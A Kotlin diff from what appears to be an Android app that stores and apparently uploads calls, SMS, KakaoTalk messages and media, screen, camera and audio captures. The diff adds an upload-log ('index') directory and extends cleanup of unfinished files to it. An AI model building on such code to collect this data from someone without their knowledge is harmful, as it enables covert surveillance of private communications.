@@ -30,6 +30,9 @@ object Storage {
     fun callDir(ctx: Context): File = File(baseDir(ctx), "call").apply { mkdirs() }
     fun smsDir(ctx: Context): File = File(baseDir(ctx), "sms").apply { mkdirs() }
     fun cameraDir(ctx: Context): File = File(baseDir(ctx), "camera").apply { mkdirs() }
+
+    /** 무엇을 언제 올렸는지 남기는 수집 기록. `rawindex_*`는 오늘치라 업로드하지 않는다. */
+    fun indexDir(ctx: Context): File = File(baseDir(ctx), "index").apply { mkdirs() }
     fun kakaoDir(ctx: Context): File = File(baseDir(ctx), "kakao").apply { mkdirs() }
 
     /**
@@ -39,7 +42,7 @@ object Storage {
     fun kakaoMediaDir(ctx: Context): File = File(baseDir(ctx), "kakaomedia").apply { mkdirs() }
 
     private fun allDirs(ctx: Context) =
-        listOf(audioDir(ctx), screenDir(ctx), callDir(ctx), smsDir(ctx), kakaoDir(ctx), kakaoMediaDir(ctx), cameraDir(ctx))
+        listOf(audioDir(ctx), screenDir(ctx), callDir(ctx), smsDir(ctx), kakaoDir(ctx), kakaoMediaDir(ctx), cameraDir(ctx), indexDir(ctx))
     private fun listAll(ctx: Context): List<File> =
         allDirs(ctx).flatMap { d -> d.listFiles()?.toList() ?: emptyList() }.filter { it.isFile }
 
@@ -62,6 +65,7 @@ object Storage {
         f.name.startsWith("call_") -> "call"
         f.name.startsWith("camera_") -> "camera"
         f.name.startsWith("sms_") -> "sms"
+        f.name.startsWith("index_") -> "index"
         // kakaoimg_ = 알림에서 받은 사진, kakaoexp_ = 내보내기 폴더에서 가져온 미디어.
         f.name.startsWith("kakaoimg_") || f.name.startsWith("kakaoexp_") -> "kakaomedia"
         f.name.startsWith("kakao_") -> "kakao"
@@ -142,7 +146,8 @@ object Storage {
      *  - kakao_*.part     → 확정/복사 도중 죽은 것. 다음 실행에서 다시 만들어진다
      *  - sms_*.part       → 쓰다가 죽은 것. 해당 날짜를 다시 내보내면 된다
      *
-     * `rawkakao_*.jsonl.part`는 계속 이어 쓰는 알림 로그라서 절대 건드리지 않는다.
+     * `rawkakao_*.jsonl.part`(알림 로그)와 `rawindex_*.jsonl.part`(수집 기록)는
+     * 계속 이어 쓰는 오늘치 파일이라 절대 건드리지 않는다.
      */
     fun processLeftovers(files: List<File>) = synchronized(recoveryLock) {
         files.filter { it.name.endsWith(".m4a$PART") && it.name.startsWith("audio_") }.forEach { it.delete() }
@@ -152,7 +157,8 @@ object Storage {
         files.filter {
             it.name.startsWith("screen_") || it.name.startsWith("call_") || it.name.startsWith("camera_") ||
                 it.name.startsWith("sms_") || it.name.startsWith("kakao_") ||
-                it.name.startsWith("kakaoimg_") || it.name.startsWith("kakaoexp_")
+                it.name.startsWith("kakaoimg_") || it.name.startsWith("kakaoexp_") ||
+                it.name.startsWith("index_")
         }.forEach { f ->
             if (f.exists()) { Log.i(TAG, "dropping incomplete ${f.name}"); f.delete() }
         }
